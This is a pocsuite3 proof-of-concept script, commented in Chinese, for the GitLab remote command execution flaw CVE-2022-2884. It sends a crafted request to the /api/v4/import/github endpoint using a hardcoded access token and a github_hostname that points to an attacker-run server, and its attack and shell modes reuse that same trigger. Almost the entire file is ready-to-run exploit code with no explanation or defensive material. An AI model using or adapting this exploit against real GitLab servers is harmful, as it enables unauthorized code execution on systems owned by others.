from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import POC_CATEGORY
import json

class MyPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录 ID，如果没有则为 0
    version = '1'  # PoC 的版本，默认为 1
    author = ''  # PoC 的作者
    vulDate = '2022-8-18'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2024-7-25'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2024-7-25'  # PoC 更新日期 (%Y-%m-%d)
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2884']  # 漏洞来源地址，0day 不用写
    name = 'GitLab GitLab 命令执行 (CVE-2022-2884)'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'https://about.gitlab.com/'  # 漏洞厂商主页地址
    appName = 'GitLab'  # 漏洞应用名称
    appVersion = '11.3.4-15.1.5, 15.2-15.2.3, 15.3-15.3.1'  # 漏洞影响版本
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '/api/v4/import/github接口存在命令执行漏洞'  # 漏洞简要描述
    samples = ['http://127.0.0.1:80']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = ''' 
        pocsuite -r poc脚本 -u 目标地址
        pocsuite -r poc-cve-2022-2884.py -u http://127.0.0.1 
        '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # PoC 的分类
    protocol = POC_CATEGORY.PROTOCOL.HTTP  # PoC 的默认协议，方便对 url 格式化
    protocol_default_port = 80  # 目标的默认端口，当提供的目标不包含端口的时候，方便对 url 格式化
    install_requires =["json"] # 整个字段的值为 list，每个项为一个依赖模块。


    def _verify(self):
        result = {}
        url = self.url + "/api/v4/import/github"
        headers = {
            "User-Agent": "curl/8.6.0",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "PRIVATE-TOKEN": "zHV1QJ43LgTuguqjC3b9",
            "Content-Length": "176"
        }
        data = {
            "personal_access_token": "abcdefgnamaissocool",
            "repo_id": "356289002",
            "target_namespace": "lushisi",
            "new_name": "poc2",
            "github_hostname": "http://172.30.160.1:8080"
        }

        response = requests.post(url, headers=headers, data=json.dumps(data))

        if response.json():
            result['VerifyInfo'] = response.json()
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Payload'] = json.dumps(data)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(MyPOC)

